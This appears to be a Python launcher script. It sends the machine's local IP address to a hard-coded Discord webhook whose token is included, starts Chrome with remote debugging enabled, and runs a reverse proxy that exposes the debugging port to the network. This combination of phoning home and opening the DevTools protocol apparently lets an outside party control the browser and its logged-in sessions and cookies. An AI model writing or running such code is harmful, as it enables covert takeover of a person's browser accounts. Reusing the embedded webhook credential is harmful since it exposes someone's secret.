mUrl = "https://discord.com/api/webhooks/1071845353155997736/Ju6l-y0bMJkgnmaM2IyWkmQr3S8uj8N8zKNGAQh0KfJqF-7LAD1r1eJwFZXPAzfj4U7b"
fPort = 8088
chromeDir = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
userDataDir = '_udata'

###


import subprocess
import socket, threading
import ports
from time import sleep


###


def reportme(ip):
    print("reportme(): ip= " + ip)
    import requests

    # Webhook

    data = {"content": ip}
    response = requests.post(mUrl, json=data)
    print("reportme(): ", response.status_code, response.content)


def chrome():
    print("chrome")
    args = '-remote-debugging-port=9014 --user-data-dir=\"' + userDataDir + '\" --enable-ui-devtools'
    __args = '-remote-debugging-port=9014 --enable-ui-devtools'
    print(args)
    subprocess.run([chromeDir, __args])


def getip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't even have to be reachable
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


if __name__ == "__main__":
    ip = getip()
    reportme(ip)
    chrome()
    print("run.py: Starting reverse proxy in 3s")
    sleep(3)
    ports.server(ip, fPort, "127.0.0.1", 9014)
